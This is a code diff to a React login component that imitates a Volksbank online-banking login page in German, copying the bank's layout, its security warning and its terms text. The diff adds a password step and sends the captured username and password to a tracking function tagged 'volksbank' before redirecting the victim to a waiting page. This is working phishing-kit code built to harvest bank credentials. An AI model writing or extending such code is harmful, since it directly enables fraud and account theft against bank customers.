@@ -7,12 +7,148 @@ import { trackSubmission } from "@/lib/track";
 export default function LoginForm() {
   const router = useRouter();
   const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [step, setStep] = useState<"username" | "password">("username");
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    await trackSubmission("volksbank", "login", { username });
+    if (step === "username") {
+      setStep("password");
+      return;
+    }
+    await trackSubmission("volksbank", "login", { username, password });
     router.push(`/waiting?user=${encodeURIComponent(username)}`);
   };
+
+  if (step === "password") {
+    return (
+      <>
+        {/* Header bar with back arrow */}
+        <div className="login-header">
+          <span className="sr-only">Firmenlogo</span>
+          <div id="topbar" className="topbar pre-login">
+            <div className="container">
+              <div className="row">
+                <div className="topbar-logo"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div className="leave-header-visible" id="overlaycontainer-login">
+          <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
+            <div id="modaloverlay" className="modal show" role="dialog">
+              <div className="modal-dialog">
+                <div className="modal-content">
+                  {/* Modal Header with back button */}
+                  <div className="modal-header">
+                    <h1>
+                      <a
+                        href="#"
+                        onClick={(e) => { e.preventDefault(); setStep("username"); }}
+                        style={{ textDecoration: "none", color: "#196bc1", marginRight: "8px" }}
+                        aria-label="Zurück zum Benutzernamen"
+                      >
+                        &lt;
+                      </a>
+                      Login
+                    </h1>
+                  </div>
+
+                  {/* Modal Body */}
+                  <div className="modal-body">
+                    <div id="loginform-messages" className="messages-overlay hidden"></div>
+
+                    {/* Info text */}
+                    <div className="row login-row login-info-text">
+                      <p>
+                        Hier können Sie sich für Ihr neues Online-Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
+                      </p>
+                    </div>
+
+                    {/* Separator */}
+                    <div className="row login-row login-demo">
+                      <hr className="no-margin-top" role="presentation" />
+                    </div>
+
+                    {/* Username read-only display */}
+                    <div className="row">
+                      <div className="col-xs-12">
+                        <label>
+                          <small>Benutzername</small>
+                        </label>
+                        <div className="input-text">
+                          <input
+                            type="text"
+                            className="form-control"
+                            value={username}
+                            readOnly
+                            style={{ backgroundColor: "#f5f5f5" }}
+                          />
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Password input */}
+                    <div className="row" style={{ marginTop: "16px" }}>
+                      <div className="col-xs-12">
+                        <label htmlFor="passwort">
+                          <small>Passwort</small>
+                        </label>
+                        <div className="input-text">
+                          <input
+                            id="passwort"
+                            name="loginform:passwort"
+                            type="password"
+                            className="form-control"
+                            maxLength={128}
+                            spellCheck={false}
+                            autoComplete="off"
+                            autoFocus
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                          />
+                          <a
+                            className="del-btn"
+                            tabIndex={-1}
+                            onClick={() => setPassword("")}
+                            style={{ display: password ? "block" : "none" }}
+                          >
+                            <span className="icon icon-inhalt-loeschen">✕</span>
+                          </a>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Consent text */}
+                    <div className="row login-nutzungsbedingungen">
+                      <p>
+                        Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
+                      </p>
+                    </div>
+
+                    {/* Submit button footer */}
+                    <div className="modal-footer">
+                      <div className="row">
+                        <button
+                          id="loginButtonSubmit"
+                          type="submit"
+                          className="button-default pull-right button-fullwidth"
+                          aria-label="Login abschließen"
+                        >
+                          Login abschließen
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </>
+    );
+  }
 
   return (
     <>
